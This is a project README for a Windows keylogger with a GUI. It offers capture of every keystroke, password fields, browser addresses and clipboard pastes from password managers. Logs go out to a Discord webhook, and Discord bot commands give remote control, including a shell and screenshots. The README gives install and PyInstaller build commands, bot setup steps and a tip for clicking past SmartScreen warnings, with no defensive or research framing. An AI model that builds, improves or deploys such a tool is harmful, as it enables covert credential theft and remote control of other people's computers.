# Keylogger

Windows keystroke and active-window logger with a GUI. Logs locally and
optionally mirrors to a Discord webhook. Remote control over Discord bot
commands. No account, no cloud service of mine.

![screenshot](shot.png)

## Features

- Every keystroke written to plain UTF-8
- Password fields detected and collapsed to a single clean line
- Browser address bar captured alongside the window title
- Clipboard captured on Ctrl+V (catches password-manager pastes)
- Discord webhook delivery, batched  (the window is for setup only and everything else happens in Discord)
- Remote control: `!status !start !stop !log !shot !shell !exit`

## Run from source

    pip install pynput psutil uiautomation pillow
    python keylogger_gui.py

## Build

    pip install pyinstaller
    pyinstaller --onefile --windowed --name Keylogger --hidden-import uiautomation --hidden-import PIL keylogger_gui.py

## Remote control setup

1. Create an application at https://discord.com/developers/applications, add a Bot, copy the token.
2. Invite it with the `bot` scope and Send Messages + Attach Files.
3. Paste the token and channel ID into the app, tick Remote control.

Anyone in that channel can issue commands. Keep it in a private channel.

## Notes

- Unsigned exe, so SmartScreen warns on first run. More info → Run anyway.
- Does not capture elevated windows unless run as administrator.
- Passkeys and Windows Hello logins produce nothing.

MIT licensed.